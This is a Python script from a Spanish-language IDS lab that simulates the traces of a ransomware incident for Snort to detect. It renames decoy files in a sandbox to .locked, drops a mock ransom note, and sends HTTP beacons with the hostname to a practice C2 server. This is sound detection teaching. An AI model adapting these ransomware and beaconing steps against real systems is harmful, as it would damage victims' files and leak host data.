#!/usr/bin/env python3
"""
03_simulador_ioc.py
Laboratorio: IDS y Detección de Ransomware en Kali Linux

SIMULADOR DE INDICADORES DE COMPROMISO (IOC).
Reproduce los RASTROS OBSERVABLES de un incidente de ransomware
para que Snort los detecte. NO cifra nada.

¿Qué hace?
  1. Comprueba el kill switch en el C2 (si responde 200 → se detiene).
  2. Renombra los archivos señuelo añadiendo .locked  (reversible).
  3. Deposita una nota de rescate FICTICIA en texto plano.
  4. Envía beacons HTTP periódicos al panel C2 de práctica.

¿Qué NO hace?
  ✗ No cifra contenido con ningún algoritmo.
  ✗ No toca archivos fuera del directorio data/victima_documentos/.
  ✗ No persiste al reinicio (no hay cron ni servicio).
  ✗ No se propaga a otros hosts.
  ✗ No recibe ni ejecuta comandos del C2.

Uso (terminal 3, VM VÍCTIMA):
    python3 scripts/03_simulador_ioc.py <IP_ATACANTE> [--beacons 5] [--puerto 4444]
"""

import os
import sys
import time
import glob
import socket
import argparse
import urllib.request
import urllib.error

# ── Rutas relativas al repositorio (no depende de $HOME) ─────
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LAB_DIR    = os.path.dirname(SCRIPT_DIR)
SANDBOX    = os.path.join(LAB_DIR, "data", "victima_documentos")
PATRON     = "documento_confidencial_*.txt"
UA         = "LabRansomSim/1.0"

NOTA_RESCATE = """\
╔══════════════════════════════════════════════════════════╗
║          *** NOTA DE RESCATE — SÓLO PARA EL LAB ***      ║
╠══════════════════════════════════════════════════════════╣
║  Tus archivos han sido "bloqueados" (SIMULACIÓN).        ║
║  No se cifró ningún contenido real.                      ║
║                                                          ║
║  Esto es un ejercicio educativo de detección con IDS.   ║
║  Para restaurar los archivos completa los retos y        ║
║  ejecuta: bash scripts/05_restaurar_sistema.sh           ║
╚══════════════════════════════════════════════════════════╝
"""

CYAN="\033[0;36m"; GREEN="\033[0;32m"; YELLOW="\033[1;33m"
RED="\033[0;31m"; BOLD="\033[1m"; NC="\033[0m"


def http_get(url: str, timeout: int = 5) -> int | None:
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status
    except Exception:
        return None


def main():
    parser = argparse.ArgumentParser(description="Simulador IOC de ransomware")
    parser.add_argument("ip_atacante", help="IP del servidor C2 de práctica")
    parser.add_argument("--beacons", type=int, default=5)
    parser.add_argument("--puerto",  type=int, default=4444)
    parser.add_argument("--intervalo", type=int, default=3,
                        help="Segundos entre beacons")
    args = parser.parse_args()

    base  = f"http://{args.ip_atacante}:{args.puerto}"
    hname = socket.gethostname()

    print(f"{CYAN}{BOLD}")
    print("╔═══════════════════════════════════════════════════╗")
    print("║  💣  Simulador IOC de Ransomware — LAB EDUCATIVO  ║")
    print("╚═══════════════════════════════════════════════════╝")
    print(f"{NC}  C2: {base}  |  Beacons: {args.beacons}")
    print(f"  Sandbox: {SANDBOX}\n")

    # 1 ── KILL SWITCH ──────────────────────────────────────────
    print(f"{BOLD}[1/4] Kill switch...{NC}")
    ks = http_get(f"{base}/killswitch")
    if ks == 200:
        print(f"  {GREEN}✔ Kill switch ACTIVO — simulador detenido (buen trabajo).{NC}")
        sys.exit(0)
    print(f"  {YELLOW}✘ Sin kill switch activo (código {ks}).{NC}")

    # 2 ── RENOMBRADO DE ARCHIVOS ───────────────────────────────
    if not os.path.isdir(SANDBOX):
        print(f"\n{RED}[!] No existe el sandbox: {SANDBOX}")
        print(f"    Ejecuta primero: bash scripts/00b_preparar_lab.sh{NC}")
        sys.exit(1)

    archivos = glob.glob(os.path.join(SANDBOX, PATRON))
    print(f"\n{BOLD}[2/4] Renombrando {len(archivos)} archivos → .locked{NC}")
    for f in archivos:
        dest = f + ".locked"
        os.rename(f, dest)
        print(f"  {YELLOW}⟳{NC}  {os.path.basename(f)} → {os.path.basename(dest)}")
        time.sleep(0.25)

    # 3 ── NOTA DE RESCATE ──────────────────────────────────────
    print(f"\n{BOLD}[3/4] Depositando nota de rescate...{NC}")
    nota_path = os.path.join(SANDBOX, "LEEME_RESCATE.txt")
    with open(nota_path, "w") as fh:
        fh.write(NOTA_RESCATE)
    print(f"  {YELLOW}⚠{NC}  {nota_path}")

    # 4 ── BEACONS C2 ───────────────────────────────────────────
    print(f"\n{BOLD}[4/4] Enviando {args.beacons} beacons al C2...{NC}")
    for i in range(1, args.beacons + 1):
        url   = f"{base}/beacon?id={hname}&seq={i}&files={len(archivos)}"
        code  = http_get(url, timeout=5)
        estado = f"{GREEN}OK{NC}" if code == 200 else f"{RED}SIN RESPUESTA{NC}"
        print(f"  beacon {i}/{args.beacons} → {estado}")
        if i < args.beacons:
            time.sleep(args.intervalo)

    print(f"\n{CYAN}{BOLD}💀 Simulación terminada.{NC}")
    print(f"   Archivos 'bloqueados': {len(archivos)}")
    print(f"   ¿Cuántas alertas generó Snort?")
    print(f"   → Snort 3:  sudo tail /var/log/snort/alert_fast.txt")
    print(f"   → Snort 2:  sudo tail /var/log/snort/alert\n")


if __name__ == "__main__":
    main()
